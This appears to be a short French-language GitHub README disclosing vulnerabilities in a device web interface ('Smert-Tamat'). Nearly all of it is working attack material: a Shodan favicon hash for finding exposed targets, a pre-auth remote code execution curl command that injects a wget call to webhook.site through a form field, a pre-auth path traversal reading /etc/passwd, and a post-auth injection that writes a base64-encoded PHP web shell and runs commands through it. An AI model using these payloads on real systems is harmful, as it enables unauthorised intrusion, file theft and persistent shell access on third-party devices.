![image](https://github.com/Ug0Security/Smert-Tamat/assets/28728543/fc846835-252b-406e-94d5-2e9fe1815e4d)



Encore une pre auth RCE random

http.favicon.hash:1429120848

curl -X POST TARGET -d "ok=1&tamat_smsNums=&tamat_telNums=&battery_min_alarm=&life_msg_timer=&display_timer=&phone_number='$(wget%20http://webhook.site/xxx/)"

il y a plein d'autres trucs dont un file read pre auth

/swinst/download_file.php?file=/etc/passwd

et des RCE post auth  qui mon permis de facilité la recherche de la RCE pré auth heh...

/swinst/reboot.php?sw_active=$(echo "PD89YCRfR0VUWzBdYDs=" | base64 -d > shell.php)  (attention ça reboot)
puis /swinst/shell.php?0=id
